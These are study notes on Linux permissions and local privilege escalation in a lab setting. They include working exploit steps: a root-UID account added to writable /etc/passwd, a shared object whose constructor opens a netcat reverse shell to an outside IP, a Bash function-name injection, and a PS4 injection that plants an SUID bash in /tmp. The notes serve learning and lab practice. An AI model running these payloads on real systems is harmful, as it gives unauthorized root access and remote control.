## 1. Linux File Permissions

Linux permissions control **who can read, write, or execute** a file or directory.

Every file has three permission categories:
```text
Owner       Group       Others
  ↓           ↓           ↓
-rwx        r-x         r--
```

The three basic permissions are:

|Permission|Symbol|Value|Meaning|
|---|--:|--:|---|
|Read|`r`|4|Read file contents|
|Write|`w`|2|Modify file|
|Execute|`x`|1|Execute file / access directory|
|None|`-`|0|No permission|

---

## 2. Understanding `ls -l`

Command:
```bash
ls -l file.txt
```

Example output:
```text
-rwxr-xr-- 1 eyad users 120 Aug 17 14:00 file.txt
```

Breakdown:
```text
- rwx  r-x  r--
│ ├──┤ ├──┤ ├──┤
│   │     │    │
│   │     │    └── Others
│   │     └─────── Group
│   └──────────── Owner
└─────────────── File type
```

### First character

The first character identifies the file type:
```text
-    Regular file
d    Directory
l    Symbolic link
c    Character device
b    Block device
s    Socket
p    Named pipe
```

Example:
```text
-rwxr-xr--
```

The first `-` means it's a regular file.

---

# 3. Numeric Permissions

Linux represents permissions using numbers:
```text
r = 4
w = 2
x = 1
```

Add the values together.
### `rwx`
```text
r + w + x
4 + 2 + 1
= 7
```

Common permissions:
```text
777 → rwxrwxrwx
755 → rwxr-xr-x
700 → rwx------
644 → rw-r--r--
600 → rw-------
```

---

# 4. `chmod`

`chmod` changes file permissions.
## Numeric syntax

```bash
chmod 755 script.sh
```

Result:

```text
-rwxr-xr-x
```

Meaning:

```text
Owner  = 7 = rwx
Group  = 5 = r-x
Others = 5 = r-x
```

Check:

```bash
ls -l script.sh
```

Expected:

```text
-rwxr-xr-x 1 eyad users 120 Aug 17 14:00 script.sh
```

---

## Symbolic `chmod`

You can also modify individual permission categories.
### Add execute permission to owner
```bash
chmod u+x script.sh
```
### Add write permission to group
```bash
chmod g+w file.txt
```
### Remove read permission from others
```bash
chmod o-r file.txt
```
### Add execute permission for everyone
```bash
chmod a+x script.sh
```

Where:
```text
u = user/owner
g = group
o = others
a = all
```

---

# 5. `chown`

`chown` changes the owner of a file.

Syntax:
```bash
chown USER file
```

Example:
```bash
sudo chown root script.sh
```

Check:
```bash
ls -l script.sh
```

Expected:
```text
-rwxr-xr-x 1 root users 120 Aug 17 14:00 script.sh
```

You can change both owner and group:
```bash
sudo chown root:root script.sh
```

Expected:

```text
-rwxr-xr-x 1 root root 120 Aug 17 14:00 script.sh
```

---

# 6. `chgrp`

`chgrp` changes the group ownership.
```bash
sudo chgrp developers script.sh
```

Check:
```bash
ls -l script.sh
```

Expected:
```text
-rwxr-xr-x 1 eyad developers 120 Aug 17 14:00 script.sh
```

Difference:
```text
chown → change owner/group
chgrp → change group
chmod → change permissions
```

---
# 7. Special Permissions

Linux has three important special permissions:

```text
SUID
SGID
Sticky Bit
```

They are represented by special bits:

```text
SUID       = 4000
SGID       = 2000
Sticky Bit = 1000
```

These can be seen using:

```bash
ls -l
```

---

# 8. SUID

**SUID = Set User ID**

SUID is mainly relevant to executable files.

It is a special type of file permission that allows a user to execute a program with the temporary permissions of the file's owner rather than the user running it.

If the owner is `root`:
```text
-rwsr-xr-x 1 root root ...
```

the program may execute with an effective UID of `root`.

Notice:
```text
rws
  ↑
 SUID
```

Normally:
```text
rwx
```
With SUID:

```text
rws
```

---

# 9. Finding SUID Files

This is one of the most important Linux privilege-escalation enumeration commands:
```bash
find / -perm -4000 -type f 2>/dev/null
```

Example output:
```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/find
```

Another form:
```bash
find / -perm -u=s -type f 2>/dev/null
```

You can then inspect suspicious results:
```bash
ls -l /usr/bin/find
```

Example:
```text
-rwsr-xr-x 1 root root 320000 Aug 17 14:00 /usr/bin/find
```

The important observations are:
```text
Owner = root
SUID  = enabled
Binary = find
```

---

# 10. Why SUID Can Cause Privilege Escalation

The dangerous pattern is:
```text
SUID
  +
Owner = root
  +
Vulnerable / exploitable binary
  =
Potential root privileges
```

For example:
```text
-rwsr-xr-x 1 root root /usr/local/bin/custom
```

A normal user executing it may have:
```text
uid=1000(eyad)
```

while the process could have:
```text
euid=0(root)
```

The **effective UID** is important because Linux uses it when determining many access-control decisions.

---

# 11. Dangerous SUID Binaries

Not every SUID binary is vulnerable.

Common legitimate SUID programs include:
```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
```

The interesting cases are:
```text
Unexpected SUID binary
        +
Owned by root
        +
Allows command execution / file access / shell escape
        =
Potential privilege escalation
```

When you find an unusual SUID binary:

```bash
ls -l /path/to/binary
file /path/to/binary
strings /path/to/binary
```

You can also check whether it is a known binary with an abuse technique using **GTFOBins**.

---

# 12. SGID

**SGID = Set Group ID**

SGID has two different behaviors.

For an executable:
```text
-rwxr-sr-x
```

The:
```text
  s
  ↑
 SGID
```

The Set Group ID (SGID) permission **allows users to execute a file with the permissions of the file's group.**

Example:
```text
-rwxr-sr-x 1 root backup 15000 Aug 17 14:00 backup
```

The important information is:
```text
Owner = root
Group = backup
SGID  = enabled
```

The program can execute with the `backup` group privileges.

---

# 13. Finding SGID Files

Use:
```bash
find / -perm -2000 -type f 2>/dev/null
```

Example:
```text
/usr/bin/write
/usr/bin/wall
/usr/local/bin/backup
```

Inspect an interesting one:
```bash
ls -l /usr/local/bin/backup
```

Expected:
```text
-rwxr-sr-x 1 root backup 15000 Aug 17 14:00 /usr/local/bin/backup
```

---

# 14. SGID Directories

SGID also has an important behavior on directories.

Create one:
```bash
mkdir shared
chmod 2775 shared
```

Check:
```bash
ls -ld shared
```

Expected:
```text
drwxrwsr-x 2 eyad developers 4096 Aug 17 14:00 shared
```

Notice:

```text
drwxrws
     ↑
    SGID
```

Files created inside inherit the directory's group.
```bash
touch shared/test.txt
ls -l shared/test.txt
```

Expected:
```text
-rw-r--r-- 1 eyad developers 0 Aug 17 14:00 shared/test.txt
```

---

# 15. SGID Privilege Escalation Concept

SGID escalation generally involves:
```text
SGID binary
     ↓
Runs with privileged group
     ↓
Binary has dangerous functionality
     ↓
User can access resources belonging to that group
```

For example, imagine:
```text
-rwxr-sr-x root secretgroup /usr/local/bin/viewer
```

and the program allows arbitrary file access.

If `secretgroup` can access sensitive files, the SGID program might allow a normal user to access resources they normally couldn't.

The important point:

> **SGID does not automatically mean root.** It provides the privileges of the file's group.

---

# 16. Sticky Bit

The Sticky Bit is commonly found on shared directories such as `/tmp`.

Check:
```bash
ls -ld /tmp
```

Expected:
```text
drwxrwxrwt 15 root root 4096 Aug 17 14:00 /tmp
```

Notice:

```text
drwxrwxrwt
        ↑
   Sticky Bit
```

The Sticky Bit means users can create files in the shared directory but generally cannot delete or rename files belonging to other users.

Set it manually:

```bash
chmod 1777 shared
```

Check:

```bash
ls -ld shared
```

Expected:

```text
drwxrwxrwt 2 eyad eyad 4096 Aug 17 14:00 shared
```

---

# 17. Writable Files

Writable files are important because a privileged process may execute or read them.

Find writable files:

```bash
find / -writable -type f 2>/dev/null
```

However, don't assume:
```text
writable file = privilege escalation
```

You need to adsk:
```text
Who owns it?
Who executes it?
Is root involved?
Is it a configuration file?
Is it a script?
Is it loaded by a privileged service?
```

---

# 18. Writable Directories

Find writable directories:
```bash
find / -writable -type d 2>/dev/null
```

Example:
```text
/tmp
/opt/scripts
/home/eyad/tools
```

A writable directory becomes particularly interesting if a **root process searches that directory for executables, scripts, libraries, or configuration files**.

---

# 19. `/etc/passwd` Writable — Critical Misconfiguration

Normally:
```bash
ls -l /etc/passwd
```

Expected:
```text
-rw-r--r-- 1 root root 3000 Aug 17 14:00 /etc/passwd
```

A normal user should **not** be able to modify it.

If you find:
```text
-rw-rw-rw- 1 root root 3000 Aug 17 14:00 /etc/passwd
```

that's a critical misconfiguration.

Why?

`/etc/passwd` contains account information:
```text
username:x:UID:GID:comment:home:shell
```

Example:
```text
root:x:0:0:root:/root:/bin/bash
eyad:x:1000:1000:Eyad:/home/eyad:/bin/bash
```

The important field for privilege escalation is:
```text
UID
```

A user with:
```text
UID = 0
```

has root-level identity.

---

# 20. Adding a Root-UID Account Through Writable `/etc/passwd`


First generate a password hash:
```bash
openssl passwd -6 'LabPassword123!'
```

Example output:
```text
$6$randomsalt$somegeneratedhash...
```

Then, if `/etc/passwd` is genuinely writable, an attacker could add an entry with UID `0`:
```text
laroot:$6$randomsalt$somegeneratedhash...:0:0:labroot:/root:/bin/bash
```

The structure is:
```text
username:password_hash:UID:GID:comment:home:shell
```

The critical fields are:
```text
UID = 0
GID = 0
```

Then:
```bash
su laroot
```

Enter the password.

Check:
```bash
id
```

Expected:
```text
uid=0(laroot) gid=0(root) groups=0(root)
```

This demonstrates why writable `/etc/passwd` is a **critical privilege-escalation misconfiguration**.

### Modern systems

Many modern systems use `/etc/shadow` for password hashes, so `/etc/passwd` normally contains:

```text
username:x:UID:GID:...
```

The `x` means the actual password hash is stored in `/etc/shadow`.

---

# Shared Object Injection

### What is a Shared Object?
A **shared object** is a dynamically linked library used by Linux programs.

Shared libraries normally have the `.so` extension.

Examples:

```text
libc.so
libssl.so
libcrypto.so
```

Programs can load shared objects at runtime instead of having all functionality compiled directly into the executable.

## Shared Object Injection
**Shared object injection** occurs when a privileged executable loads a library from a location that an attacker can control.

If the vulnerable program runs with **SUID**, the injected shared object may execute with the privileges of the executable.

### Attack Scenario
```text
SUID executable
       ↓
Loads shared object
       ↓
/home/user/.config/libcalc.so
       ↓
Attacker controls this location
       ↓
Malicious libcalc.so
       ↓
Code executes with SUID privileges
       ↓
Root shell
```

## Identifying the Vulnerability

The vulnerable executable is:
```bash
/usr/local/bin/suid-so
```

Run it normally:
```bash
/usr/local/bin/suid-so
```

Initially, it displays a progress bar and exits.

To investigate what files the program accesses, use `strace`:
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

`strace` allows us to observe system calls made by a program.

The important finding is that the executable attempts to load:
```text
/home/user/.config/libcalc.so
```
but the file does not exist.
This is significant because the path is inside the user's home directory.

## Why the Location Matters
The executable is **SUID**, meaning it executes with the privileges of its file owner.

If the owner is `root`, execution can effectively occur with root privileges.

If a root-owned SUID program loads a library from a directory writable by a normal user:

```text
Root SUID program
       ↓
Loads library
       ↓
User-controlled path
       ↓
Malicious library
       ↓
Code executes with elevated privileges
```
This creates a **privilege-escalation opportunity**.

## Exploitation

First create the directory expected by the executable:
```bash
mkdir /home/user/.config
```

A sample shared-object
```C
#include <stdio.h>  
#include <stdlib.h>  
  
static void func() __attribute__ ((constructor));  
  
static void func() {  
   setuid(0); // 0 uid is for root  
   system("nc -e /bin/bash 10.17.33.221 4444");  //my ip and port
}
```

at:
```text
/home/user/tools/suid/libcalc.c
```

The source contains code that spawns a Bash reverese shell.

Compile it as a shared object:
```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

### Important GCC Options

|Option|Purpose|
|---|---|
|`-shared`|Create a shared library instead of a normal executable|
|`-fPIC`|Generate Position Independent Code|
|`-o`|Specify the output file|

The resulting file is:
```text
/home/user/.config/libcalc.so
```

Now execute the SUID program again:
```bash
/usr/local/bin/suid-so
```

Instead of the original progress bar, the program loads the attacker-controlled shared object.

Because the vulnerable executable is SUID, the injected code executes with its elevated privileges, resulting in a **root shell** in the lab.

## Important Concept
The vulnerability exists because **a privileged SUID program trusts a shared library located in an attacker-controlled directory**.

The dangerous combination is:
```text
SUID
+
Dynamic Library Loading
+
Attacker-Controlled Library Path
=
Potential Privilege Escalation
```

### Key Takeaway

> **A SUID binary becomes dangerous when it dynamically loads a shared object from a location that an unprivileged user can control.**


---

# Abusing Shell Features

**Shell feature abuse** is a privilege-escalation technique where a privileged program interacts with shell functionality in an unsafe way.

Unlike PATH hijacking, these attacks can work **even when the program uses an absolute path**, because the attacker abuses features of the shell itself.

## 1. Bash Function Name Injection

### Vulnerable Binary

The target is:
```bash
/usr/local/bin/suid-env2
```

It is similar to `suid-env`, but it uses the absolute path:
```text
/usr/sbin/service
```

Verify this with:
```bash
strings /usr/local/bin/suid-env2
```

the output:
```text
/usr/sbin/service
```
to another executable.

### Bash Function Import Vulnerability

Older versions of Bash had a feature that allowed exported shell functions to have names resembling filesystem paths.

This can be abused to override a command even when the program specifies an absolute path.

The relevant vulnerable Bash versions are:
```text
Bash < 4.2-048
```

Check the Bash version:
```bash
/bin/bash --version
```

### Create the Malicious Function

Create a function named exactly like the executable being called:
```bash
function /usr/sbin/service { /bin/bash -p; }
```

The function executes:
```bash
/bin/bash -p
```
The `-p` option tells Bash to preserve the effective privileges instead of dropping them.

Export the function:
```bash
export -f /usr/sbin/service
```

Now execute:
```bash
/usr/local/bin/suid-env2
```

In the vulnerable Bash environment, the exported function can take precedence over the actual `/usr/sbin/service` executable.

Because `suid-env2` is **SUID**, the resulting Bash process can retain elevated privileges.

### Attack Chain
```text
SUID program
     ↓
Calls /usr/sbin/service
     ↓
Absolute path prevents PATH hijacking
     ↓
Old Bash imports exported function
     ↓
Function named /usr/sbin/service
     ↓
Function executes /bin/bash -p
     ↓
Elevated shell
```

### Important Point
> **Absolute paths protect against traditional PATH hijacking, but they do not necessarily protect against vulnerabilities in the shell used to execute the command.**

---

# 2d. Bash Debugging + PS4 Injection

Another shell-feature abuse technique involves Bash's **debugging mode** and the `PS4` environment variable.

**NOTE** --> This will not work on Bash versions 4.4 and above
### What is PS4?
`PS4` controls the prompt displayed by Bash when command tracing/debugging is enabled.

For example, with:
```bash
set -x
```
Bash prints commands before executing them.
`PS4` controls the text displayed before those commands.

## Why PS4 Can Be Dangerous

In vulnerable Bash versions, an attacker may be able to place a command substitution inside `PS4`:
```bash
PS4='$(command)'
```

When Bash performs debugging/tracing, the command substitution can be evaluated.

This creates a situation where an attacker-controlled environment variable can cause arbitrary command execution.

###  Exploitation
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Breakdown:

|Component|Purpose|
|---|---|
|`env -i`|Starts with a mostly empty environment|
|`SHELLOPTS=xtrace`|Enables Bash execution tracing|
|`PS4=...`|Defines the debug prompt|
|`$(...)`|Command substitution|
|`cp /bin/bash /tmp/rootbash`|Creates a copy of Bash|
|`chmod +xs /tmp/rootbash`|Gives the copy SUID permissions|
|`suid-env2`|Executes the vulnerable SUID program|
in that command, the `PS4` environment variable is passed specifically to `/usr/local/bin/suid-env2` and the processes it launches/inherits it from.

The payload effectively creates:
```text
/tmp/rootbash
```
as an SUID copy of Bash.

### Execute the SUID Bash

After the vulnerable program has executed:
```bash
/tmp/rootbash -p
```

## Cleanup

Remove the SUID Bash copy:
```bash
rm /tmp/rootbash
```

Then exit the elevated shell:
```bash
exit
```

Cleanup is important because `/tmp/rootbash` remains an SUID executable until removed.

---
# 21. Finding Interesting Writable System Files

A useful command:
```bash
find /etc -writable -type f 2>/dev/null
```

Example:
```text
/etc/passwd
/etc/some-service/config.conf
```

Then investigate:
```bash
ls -l /etc/passwd
```

and:
```bash
ls -l /etc/some-service/config.conf
```

Don't modify system files during enumeration.

---

# 22. `find` Enumeration

`find` is one of the most useful Linux enumeration tools.

### Find SUID files
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Find SGID files
```bash
find / -perm -2000 -type f 2>/dev/null
```

### Find writable files
```bash
find / -writable -type f 2>/dev/null
```

### Find writable directories
```bash
find / -writable -type d 2>/dev/null
```

### Find files owned by root
```bash
find / -user root -type f 2>/dev/null
```

### Find recently modified files
```bash
find / -type f -mtime -1 2>/dev/null
```

This can be useful when investigating recently changed scripts/configurations.

---

# 23. `find` + Permission Enumeration

A useful workflow:
```bash
find / -perm -4000 -type f 2>/dev/null
```
↓
```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/find
/usr/local/bin/custom
```
↓
Investigate:
```bash
ls -l /usr/local/bin/custom
```
↓
```text
-rwsr-xr-x root root /usr/local/bin/custom
```
↓
Identify the binary:
```bash
file /usr/local/bin/custom
```
↓
Search for known abuse techniques:

```text
GTFOBins / documentation / binary behavior
```
↓
Determine whether the SUID behavior can actually provide elevated privileges.

---

# 24. PrivEsc Decision Tree

```text
Got low-privileged shell
        │
        ▼
      id
        │
        ├── Interesting groups?
        │
        ├── sudo -l
        │       │
        │       └── Interesting binary?
        │               ↓
        │           GTFOBins
        │
        ├── SUID?
        │       │
        │       └── Unusual root binary?
        │               ↓
        │           Investigate
        │
        ├── SGID?
        │       │
        │       └── Interesting group privileges?
        │
        ├── Writable files?
        │       │
        │       ├── /etc/passwd?
        │       ├── Root script?
        │       └── Privileged config?
        │
        ├── Writable directories?
        │
        └── Capabilities?
```

---

# 25. Quick Reference

| Goal                | Command                                  |
| ------------------- | ---------------------------------------- |
| Find SUID           | `find / -perm -4000 -type f 2>/dev/null` |
| Find SGID           | `find / -perm -2000 -type f 2>/dev/null` |
| Find writable files | `find / -writable -type f 2>/dev/null`   |
| Find writable dirs  | `find / -writable -type d 2>/dev/null`   |
| Find root files     | `find / -user root -type f 2>/dev/null`  |
| Check passwd        | `ls -l /etc/passwd`                      |
| Check groups        | `groups`                                 |
| Check identity      | `id`                                     |
| Check sudo          | `sudo -l`                                |

## Key things to memorize
```text
4000 → SUID
2000 → SGID
1000 → Sticky Bit
```

And the three most important enumeration commands for this topic:
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null
```

The core privilege-escalation idea is:

> **Find a permission that gives a low-privileged user control over something that executes or operates with higher privileges.**



